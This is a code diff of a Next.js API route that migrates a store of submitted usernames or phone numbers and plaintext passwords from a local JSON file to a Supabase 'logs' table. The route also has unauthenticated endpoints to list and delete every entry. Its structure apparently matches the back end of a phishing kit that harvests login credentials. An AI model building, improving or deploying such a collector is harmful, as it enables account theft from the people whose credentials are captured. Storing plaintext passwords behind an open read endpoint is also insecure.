@@ -1,34 +1,19 @@
 import type { NextApiRequest, NextApiResponse } from 'next';
-import fs from 'fs';
-import path from 'path';
+import { supabase } from '../../lib/supabase';
 
-// Path to our dummy database file
-const dataFilePath = path.join(process.cwd(), 'data', 'logs.json');
-
-// Ensure the data directory and file exist
-const ensureDataFileExists = () => {
-  try {
-    const dirPath = path.join(process.cwd(), 'data');
-    if (!fs.existsSync(dirPath)) {
-      fs.mkdirSync(dirPath, { recursive: true });
-    }
-    if (!fs.existsSync(dataFilePath)) {
-      fs.writeFileSync(dataFilePath, JSON.stringify([]));
-    }
-  } catch (error) {
-    console.error("Failed to ensure data file exists:", error);
-  }
-};
-
-export default function handler(req: NextApiRequest, res: NextApiResponse) {
-  ensureDataFileExists();
-
+export default async function handler(req: NextApiRequest, res: NextApiResponse) {
   try {
     if (req.method === 'GET') {
-      const fileData = fs.readFileSync(dataFilePath, 'utf8');
-      const logs = JSON.parse(fileData);
-      return res.status(200).json(logs);
+      // Fetch logs from Supabase
+      const { data, error } = await supabase
+        .from('logs')
+        .select('*')
+        .order('created_at', { ascending: false });
+
+      if (error) throw error;
+      return res.status(200).json(data);
     } 
+    
     else if (req.method === 'POST') {
       const { username, phone, password } = req.body;
       
@@ -37,31 +22,36 @@ export default function handler(req: NextApiRequest, res: NextApiResponse) {
         return res.status(400).json({ error: "Missing required fields" });
       }
 
-      const fileData = fs.readFileSync(dataFilePath, 'utf8');
-      const logs = JSON.parse(fileData);
-      
-      const newLog = {
-        id: Date.now().toString(),
-        timestamp: new Date().toISOString(),
-        identifier: username || phone,
-        password: password,
-        type: username ? 'email/user' : 'phone'
-      };
-      
-      logs.push(newLog);
-      fs.writeFileSync(dataFilePath, JSON.stringify(logs, null, 2));
-      
+      // Insert into Supabase
+      const { data, error } = await supabase
+        .from('logs')
+        .insert([
+          { 
+            identifier: username || phone, 
+            password: password, 
+            type: username ? 'email/user' : 'phone' 
+          }
+        ]);
+
+      if (error) throw error;
       return res.status(201).json({ success: true });
     }
+    
     else if (req.method === 'DELETE') {
-      fs.writeFileSync(dataFilePath, JSON.stringify([]));
+      // Clear all logs from Supabase
+      const { error } = await supabase
+        .from('logs')
+        .delete()
+        .neq('id', 0); // Delete everything where ID is not 0 (all rows)
+
+      if (error) throw error;
       return res.status(200).json({ success: true });
     }
 
     res.setHeader('Allow', ['GET', 'POST', 'DELETE']);
     return res.status(405).end(`Method ${req.method} Not Allowed`);
-  } catch (error) {
-    console.error("API Error:", error);
-    return res.status(500).json({ error: "Internal Server Error" });
+  } catch (error: any) {
+    console.error("Supabase API Error:", error.message);
+    return res.status(500).json({ error: error.message || "Internal Server Error" });
   }
 }
